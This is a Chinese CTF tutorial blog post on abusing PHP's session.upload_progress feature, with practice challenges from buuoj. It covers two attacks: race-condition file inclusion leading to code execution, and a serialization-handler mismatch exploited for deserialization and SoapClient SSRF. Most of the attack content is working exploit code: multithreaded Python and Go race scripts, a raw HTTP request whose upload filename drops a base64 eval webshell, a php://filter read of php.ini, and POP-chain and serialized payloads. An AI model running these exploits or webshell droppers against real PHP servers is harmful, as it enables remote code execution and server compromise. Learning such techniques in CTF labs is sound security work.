# 0x1.前言

这个知识点之前看了很多博客，也总结了很多篇笔记，但是都不系统或者简洁好用，所以这次自己好好整理一下，方便下次能直接使用，也过一下整个知识点，方便自己学习。  
本文根据实际的题目进行分析，这些题目在buuoj上都有现成的环境，也方便师傅们自己实验，如果文章中有什么不对的地方，欢迎各位师傅在评论区指出来。

# 0x2.正文

## 0.通用的注意要点

### 0.1.版本要求

首先是 **版本需求** ：`≥5.4`（在php7.4实验还能成功）

### 0.2.利用前提

然后是 **两种使用前提** ：

  1. 存在文件包含漏洞

  2. session在存储时序列化的引擎和脚本中使用的引擎不同

以上两种使用前提分别代表了两种不同的利用方式，这里分别记录。

### 0.3.利用的php配置属性和默认值【重要】

这里利用到了php的几个属性，这里逐个讲解一下。  
在php.ini有以下几个 **默认选项** ：

    
    
    session.save_path = "/var/lib/php/sessions"
    session.upload_progress.enabled = on
    session.upload_progress.cleanup = on
    session.upload_progress.prefix = "upload_progress_"
    session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
    session.upload_progress.freq = "1%"
    session.upload_progress.min_freq = "1"
    session.use_strict_mode = off
    

**重要的选项：**  
`session.save_path`：session的存储路径，重要性自然不用说。  
`session.upload_progress.enabled=on`：表示php开启了上传记录功能，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、
**文件名** 、上传进度等)存储在session当中， **所以我们可以利用上传的文件名来写入php代码** 。  
`session.upload_progress.cleanup=on`：表示当文件上传结束后，php将会立即清空对应session文件中的内容，也就代表我们每次
**正常访问** session文件时都是 **空文件** 。  
`session.upload_progress.name`：
**这个属性设定的键名出现在表单中是，php就会利用上传记录功能上传进度，并且这个键的值可控** ， **所以我们也可以利用这个键的值写入php代码** 。
**【谨防一些出题人将这个值手动修改，这样就需要修改脚本】**

`session.upload_progress.freq`和`session.upload_progress.min_freq`：

`session.upload_progress.freq`：定义上传进度信息的更新频率。这可以以字节为单位（即“每 100
字节后更新进度信息”）或百分比（即“每接收到整个文件大小的 1% 后更新进度信息”）来定义。 默认为“1%”。  
`session.upload_progress.min_freq`：更新之间的最小延迟，以秒为单位。默认为“1”（一秒）。  
从这两个属性的官方说明可以看到它们相关于 **上传进度信息的更新频率** ，默认规定的是“每接收到整个文件大小的 1% 后更新进度信息”，所以
**我们上传更大的文件更容易达成条件竞争** 。  
`session.use_strict_mode`：默认值为off，表示我们对Cookie中sessionid可控，此时我们便可以更改sessionid为任意值，不过即使不能修改一般也能利用，只需要修改为正常的sessionid即可。

 **不太重要的选项：**  
`session.upload_progress.prefix`：是用于[$_SESSION
中](https://www.php.net/manual/zh/reserved.variables.session.php)上传进度键的前缀，比如默认的prefix和name下，session存储的键名就是：`upload_progress_<PHP_SESSION_UPLOAD_PROGRESS>`，但是前缀是什么无所谓，我们的利用点是
**键名** 和 **上传的文件名** ，所以它不太重要。

可以看到在默认的php配置情况下，我们是可以利用这个漏洞来向session文件中写入php代码或者其他如反序列化字符串等内容的。  
但是就怕人家改了配置，所以我们可以提前查下配置。
**我们可以在phpinfo界面查到相关的配置信息，如果存在文件包含漏洞还可以通过包含查看php.ini文件来查看配置。**

### 0.4.PHPSESSID的值

 **在利用时PHPSESSID可以自定义，但是所有字符都必须是字母或者数字，不能为其他符号。**

## 1.存在文件包含漏洞时

例题【buuoj，截取】：[[SWPU2019]Web6](https://buuoj.cn/challenges#%5BSWPU2019%5DWeb6)  
这是第一种利用方式：存在文件包含漏洞，但是却无文件可包含（上传）？那就用这个漏洞，将session设置为shell然后再包含。

### 1.1.首先查看php.ini文件配置

首先要确认一下上述比较重要的配置是否经过修改，如果修改过我们也要相应修改我们的exp。  
存在文件包含漏洞的话我们就可以直接查看到`php.ini`的内容：

    
    
    ?file=php://filter/convert.base64-encode/resource=/usr/local/etc/php/php.ini
    

这里使用的常见的默认路径，也有可能在如/usr/local/lib等路径下。  
另外 **这里有个坑，就是要转base64加密，不能直接读取** ，为啥呢？看一下默认的php.ini：  
![image.png](https://image.3001.net/images/20211102/1635864806_618150e6a552ec2380720.png!small)  
可以看到默认的php.ini中在段标签定义的这一块的注释内容中有几个php的标签，所以
**我们直接包含php.ini的话，php会把之后的内容全当作php代码来看待，然后报错，就不能显示出php.ini的内容了** 。  
然后可以在php.ini中查询上面那几个重要的属性记录下来验证。

### 1.2.示例题目

    
    
    <?php
    show_source(__FILE__);
    if(isset($_GET["file"])){
        $file = $_GET["file"];
        if(preg_match("/flag/",$file)){
            die("no flag !!!");
        }
        include $file;
    }
    

### 1.3.利用脚本

利用方式就是 **条件竞争** ，在上传进度的同时用其他进程访问session文件，以成功包含我们的php代码或者其他数据。  
因为前面提到过，在默认的配置`session.upload_progress.cleanup =
on`时，我们设置好的session文件会被上传结束后自动清空，从而使我们包含失败。  
我们就需要使用多线程来同时写入session并且文件包含，在这个时间点内完成包含就成功利用了。  
条件竞争的利用一般都和网速等因素有关系，但是一般情况下，如果脚本正确的话， **运行数秒就可以取得成果** ，
**如果长时间没有回显则大概率是脚本问题或者平台问题** ，路径不对、`session.upload_progress.name`不对等问题。

python多线程的方式有两种，另外也想说一下利用 **键名回显** 和利用 **文件名回显** 的区别，所以写了多个脚本：

#### python脚本1（面向过程）：

**建议用python2运行，因为python3的多线程有加锁，所以成功率没有python2高，不过一般也可以运行成功，但是python2的运行有时候不太好关闭，需要ctrl+z然后kill。**  
 **命令回显地点是在PHP_SESSION_UPLOAD_PROGRESS的键值处。**  
 **如果运行一会没反应的话就中断重新运行试试。**

    
    
    #!/usr/bin/env python2
    #encoding=utf-8
    
    import io
    import requests
    import threading
    
    #修改一下几个参数，运行。
    url='http://127.0.0.1/index.php'
    sessid = 'shell'
    read_session_file={'file':'/var/lib/php/sessions/sess_'+sessid}
    
    #执行任意命令：
    data = {"cmd":"system('whoami');"}
    #写入shell，密码为code：
    #data = {"cmd":"file_put_contents('shell.php',base64_decode('PD9waHAgZXZhbCgkX1JFUVVFU1RbImNvZGUiXSk7Pz4='));"}
    f = io.BytesIO(b'a' * 1024 * 50)
    
    def write(session):
        while not event.is_set():
            try:
                r = session.post( url, data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'}, files={'file': ('accEssid.txt',f)}, cookies={'PHPSESSID': sessid} )
            except:
                pass
    
    def read(session):
        while not event.is_set():
            r = session.post(url,params=read_session_file,data=data)
            if 'accEssid.txt' in r.text:
                print(r.text)
                event.set()
    
    if __name__=="__main__":
        event=threading.Event()
        with requests.session() as session:
            for i in range(1,10): 
                threading.Thread(target=write,args=(session,)).start()
                threading.Thread(target=read,args=(session,)).start()
    

脚本的思路非常简单，就是在上传进度的同时用其他进程访问session文件，以成功包含我们的php代码。

运行成功截图：  
![image.png](https://image.3001.net/images/20211102/1635864917_618151557577dba304699.png!small)

#### python脚本2（面向对象）：

 **这个只能用python3运行。**  
 **命令回显地点是在上传的文件名处。**  
 **如果运行一会没反应的话就中断重新运行试试。**

    
    
    #!/usr/bin/env python3
    #encoding=utf-8
    
    import requests
    import threading
    import io
    
    class Worker_write(threading.Thread):
        def __init__(self, event):
            super().__init__()
            self.event = event
        def run(self):
            while not self.event.is_set():
                try:
                    resp = requests.post(url,cookies=cookies,files=files,timeout=2)
                    # print("[+] " , resp.status_code)
                except:
                    pass
    
    class Worker_read(threading.Thread):
        def __init__(self, event):
            super().__init__()
            self.event = event
        def run(self):
            while not self.event.is_set():
                resp = requests.post(url,params=params)
                # print("[+] " , resp.status_code)
                if "SECuRITY.txt" in resp.text:
                    self.event.set()
                    print(resp.text)
    
    if __name__ == "__main__":
        event = threading.Event()
        event.clear()
    
        url = "http://127.0.0.1/index.php"
        sessid="shell"
        params = {"file":"/var/lib/php/sessions/sess_"+sessid}
        cookies = {"PHPSESSID":sessid}
        f = io.BytesIO(b'a' * 1024 * 50)
    
        #执行任意命令：
        cmd="<?php system('whoami');?>"
        #写入shell，密码为code：
        #cmd = "<?php file_put_contents('shell.php',base64_decode('PD9waHAgZXZhbCgkX1JFUVVFU1RbImNvZGUiXSk7Pz4='));?>"
    
        #此处"a"是表单中的name，也可以写shell
        files = {"PHP_SESSIoN_UPLOAD_PROGRESS":(None,'SECuRITY.txt'),"a":(cmd,f)}
    
        tp = []
        for i in range(10):
            t1 = Worker_write(event)
            tp.append(t1)
            t2 = Worker_read(event)
            tp.append(t2)
        for t in tp:
            t.start()
        for t in tp:
            t.join()
    

运行成功截图：  
![image.png](https://image.3001.net/images/20211102/1635865006_618151aed25732ab3d9bf.png!small)

上述两种方式可以看到 **利用键名回显** 命令和 **利用文件名回显** 命令的位置是不同的。

#### go脚本：

得益于go语言优秀的多线程能力，可以成功运行。

    
    
    package main
    
    import (
    	"io/ioutil"
    	"net"
    	"net/http"
    	"os"
    	"time"
    )
    
    func main() {
    	var hp string
    	var request_file string
    	if len(os.Args) > 1 {
    		hp = os.Args[1]
    		request_file = os.Args[2]
    	} else {
    		hp = "127.0.0.1:80"
    		request_file = "./request.txt"
    	}
    	block := make(chan bool, 1)
    	content, _ := ioutil.ReadFile(request_file)
    	for i := 0; i < 10; i++ {
    		go func(content []byte, hp string) {
    			for {
    				conn, _ := net.Dial("tcp", hp)
    				conn.Write(content)
    				conn.Close()
    			}
    		}(content, hp)
    	}
    	go func(block chan bool, hp string) {
    		for {
    			u := "http://" + hp
    			client := http.Client{
    				Timeout: time.Second * 5,
    			}
    			resp, err := client.Get(u + "/shell.php")
    			if err == nil && resp.StatusCode == 200 {
    				println("[+] Get Shell!!!")
    				block <- false
    			}
    		}
    	}(block, hp)
    	<-block
    }
    

request.txt：

    
    
    POST /index.php?file=/var/lib/php/sessions/sess_shell HTTP/1.1
    Host: 127.0.0.1
    Hello: 1
    User-Agent: curl/7.68.0
    Accept: */*
    Cookie: PHPSESSID=shell
    Content-Length: 420
    Content-Type: multipart/form-data; boundary=------------------------0429a53d19de00c3
    Connection: close
    
    --------------------------0429a53d19de00c3
    Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
    
    aaa
    --------------------------0429a53d19de00c3
    Content-Disposition: form-data; name="a"; filename="<?php file_put_contents('shell.php',base64_decode('PD9waHAgZXZhbCgkX1JFUVVFU1RbImNvZGUiXSk7Pz4='));phpinfo();?>"
    Content-Type: application/octet-stream
    
    1
    
    --------------------------0429a53d19de00c3--    

## 2.session在存储时序列化的引擎和脚本中使用的引擎不同时

第二种利用方式：session在存储时序列化的引擎和脚本中使用的引擎不同时，此时便可以通过此漏洞伪造session进行反序列化利用。

可以看下这篇博客：  
[利用session.upload_progress进行文件包含和反序列化渗透](https://www.yuque.com/yuluo-vdhow/ng5qmy/bufty0#EFYj9)

### 2.0.注意要点

#### 1.构造PHP_SESSION_UPLOAD_PROGRESS的值

 **经实验，在filename处伪造就生成session文件失败，但是伪造PHP_SESSION_UPLOAD_PROGRESS的值就可以成功伪造。**

#### 2.序列化引擎需要不同

不同的序列化引擎在序列化和反序列化session时会造成反序列化漏洞，不同的序列化引擎切换也会导致多种不同的利用方式。  
 **只有序列化和反序列化时的序列化引擎不同才有可能引起这个漏洞，所以这是利用前提。**  
 **一般脚本中有**`ini_set('session.serialize_handler', 'php');`
**这样的设置序列化引擎的代码就存在这个漏洞。**  
而这种用upload上传的方式一般会引用php.ini这种定义的序列化引擎存储，所以我们应该关注下面这条属性，一般的默认设置为（为php序列化引擎）：

    
    
    session.serialize_handler = php
    

这里介绍一下php的三种序列化引擎：

php有3种不同的序列化引擎，要利用首先要对这3种引擎有初步的了解。

不同的引擎对session的存储和反序列化方法不同：

  * php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值

  * php:存储方式是，键名+竖线+经过serialize()函数序列处理的值（`|N;admin|b:1;`=> `array(2) { [""]=> NULL ["admin"]=> bool(true) }`）

  * php_serialize(php>5.5.4):存储方式是，经过serialize()函数序列化处理的值

`php.ini` **中默认的序列化引擎是**`php`。

### 2.1.示例题目

例题网址【buuoj，截取】：[[SWPU2019]Web6](https://buuoj.cn/challenges#%5BSWPU2019%5DWeb6)  
题目源码：

    
    
    <?php
    ini_set('session.serialize_handler', 'php');
    class aa
    {
            public $mod1;
            public $mod2;
            public function __call($name,$param)
            {
                if($this->{$name})
                    {
                        $s1 = $this->{$name};
                        $s1();
                    }
            }
            public function __get($ke)
            {
                return $this->mod2[$ke];
            }
    }
    class bb
    {
            public $mod1;
            public $mod2;
            public function __destruct()
            {
                $this->mod1->test2();
            }
    } 
    class cc
    {
            public $mod1;
            public $mod2;
            public $mod3;
            public function __invoke()
            {
                    $this->mod2 = $this->mod3.$this->mod1;
            } 
    }
    class dd
    {
            public $name;
            public $flag;
            public $b;
    
            public function getflag()
            {
                    session_start(); 
                    var_dump($_SESSION);
                    $a = array(reset($_SESSION),$this->flag);
                    echo call_user_func($this->b,$a);
            }
    }
    class ee
    {
            public $str1;
            public $str2;
            public function __toString()
            {
                    $this->str1->{$this->str2}();
                    return "1";
            }
    }
    
    $a = $_POST['aa'];
    unserialize($a);
    ?>
    

这道题中给了反序列化点，并且让你可以利用session的值来操控`call_user_func`函数，这道题的解法是利用这一点实例化php的内置类：`SoapClient`，以此来SSRF得到flag。  
但是同时session反序列化还有另一种出题情况，就是
**php中没有反序列化点，没有unserialize函数的使用，但是使用了**`session_start` **或者**`ini_set`
**函数，此时也可以通过这种利用方式来反序列化，从而利用** 。

这道题中的php.ini部分配置：

    
    
    session.serialize_handler = php_serialize
    session.upload_progress.cleanup = off
    

可以看到原来的序列化引擎为php_serialize，但是在此运行环境中用`ini_set('session.serialize_handler',
'php');`更改为了php，此时就代表我们设置session的值是按照php_serialize序列化引擎存储的，但是反序列化时却是按照php序列化引擎的标准，从而造成反序列化利用。

然后构造一下poc：  
这里的poc构造就是为了利用SoapClient类的__call魔术方法。

    
    
    <?php
    $headers = array(
        'X-Forwarded-For: 127.0.0.1',
        'Cookie: user',
        );
    $headers['Cookie']='user='.base64_decode('eFptZG05TnhhZz09');//这里是其中两个字符被平台过滤了，所以处理下，但是为啥过滤那两个字符我不理解。
    $soap = new SoapClient(null,array('location' => 'http://127.0.0.1/interface.php','user_agent'=>'wupco^^'.join('^^',$headers),'uri'=> "aaab"));
    $payload = serialize($soap);
    $payload = str_replace('^^',"\r\n",$payload);
    $payload = str_replace('&','&',$payload);
    $payload = '|'.$payload;
    echo $payload;
    ?>
    

这里得到的payload我们需要利用`PHP_SESSION_UPLOAD_PROGRESS`上传到session中。  
然后构造一下pop链：  
因为直接`SoapClient`进行的`ssrf`是没有回显的，所以我们需要用到`dd`类中的`echo`来回显：

    
    
    $b=new bb();
    $a=new aa();
    $c=new cc();
    $d=new dd();
    $e=new ee();
    
    $d->b='call_user_func';
    $d->flag='Get_flag';
    
    $e->str1=$d;
    $e->str2='getflag';
    
    $c->mod1='123';
    $c->mod3=$e;
    
    $a->mod2['test2']=$c;
    
    $b->mod1=$a;
    
    echo serialize($b);
    

然后那个`$d->flag='Get_flag';`是不能修改的（可以改大小写）。  
因为使用`SoapClient`进行访问时，一般是不能得到回显结果的，服务器必须存在soap服务器才能回显服务端回显的内容，而我们这里利用题目中的`interface.php`源码如下：

    
    
    <?php
        include('Service.php');
        $ser = new SoapServer('Service.wsdl',array('soap_version'=>SOAP_1_2));
        $ser->setClass('Service');
        $ser->handle();
    ?>
    

它正是搭了一个soap服务器，而且和http的路由相同，我们在http中访问：

    
    
    /index.php?method=get_flag
    

此时它回显：

    
    
    only admin in 127.0.0.1 can get_flag
    

所以上面的`$a = array(reset($_SESSION),$this->flag);echo
call_user_func($this->b,$a);`这行代码在解析后实际上就是：

    
    
    echo call_user_func('call_user_func',array(array(object(SoapClient)),'Get_flag'));
    

我尝试改了`get_flag`为`g0t_flag`，然后可以看到报文头上有一个属性：  
![image.png](https://image.3001.net/images/20211102/1635865472_6181538004b7e47a3aee4.png!small)  
这个名为`soapaction`的`header`，应该就是soap服务器的参数，所以能成功得到flag，虽然我也不知道这个参数是怎么才传给`SoapClient`类的。

直接改一下上面的脚本1使用：  
因为这道题并没有清理session，所以直接执行一次即可，不需要条件竞争，如果清理的话改为条件竞争即可：

    
    
    #!/usr/bin/env python2
    #encoding=utf-8
    
    import io
    import requests
    import threading
    
    #修改一下几个参数，运行。
    #url='http://127.0.0.1'
    url='http://0fd7f804-0811-4359-99a6-701aa5f9289e.node4.buuoj.cn:81/se.php'
    sessid = 'shell'
    
    f = io.BytesIO(b'a' * 1024 * 50)
    
    read_session_file={'aa':'O:2:"bb":2:{s:4:"mod1";O:2:"aa":2:{s:4:"mod1";N;s:4:"mod2";a:1:{s:5:"test2";O:2:"cc":3:{s:4:"mod1";s:3:"123";s:4:"mod2";N;s:4:"mod3";O:2:"ee":2:{s:4:"str1";O:2:"dd":3:{s:4:"name";N;s:4:"flag";s:8:"get_flag";s:1:"b";s:14:"call_user_func";}s:4:"str2";s:7:"getflag";}}}}s:4:"mod2";N;}'}
    
    def write(session):
        #while not event.is_set():
    	try:
            tmp='|O:10:"SoapClient":4:{s:3:"uri";s:4:"aaab";s:8:"location";s:30:"http://127.0.0.1/interface.php";s:11:"_user_agent";s:60:"wupco\r\nX-Forwarded-For: 127.0.0.1\r\nCookie: user=xZmd19NxaQ==";s:13:"_soap_version";i:1;}'
            tmp=tmp.replace('user=xZmd1','user=xZmdm')#同上面，也是有被过滤的
    		r = session.post( url, data={'PHP_SESSION_UPLOAD_PROGRESS': tmp}, files={'file':('123',f)
    	}, cookies={'PHPSESSID': sessid} )
    	except:
    		pass
    
    def read(session):
        #while not event.is_set():
    	r = session.post(url,data=read_session_file,cookies={'PHPSESSID': sessid})
    	if 'array(0)' not in r.text:
    		print(r.text)
    		event.set()
    
    if __name__=="__main__":
        event=threading.Event()
        session=requests.session()
        write(session)
        read(session)
        #with requests.session() as session:
        #    for i in range(1,10): 
        #        threading.Thread(target=write,args=(session,)).start()
        #        threading.Thread(target=read,args=(session,)).start()
    

getflag：  
![image.png](https://image.3001.net/images/20211102/1635865495_61815397e3aacf2a57539.png!small)

# 0x3.参考

  * https://www.freebuf.com/vuls/202819.html

  * https://www.cnblogs.com/Oran9e/p/8082962.html

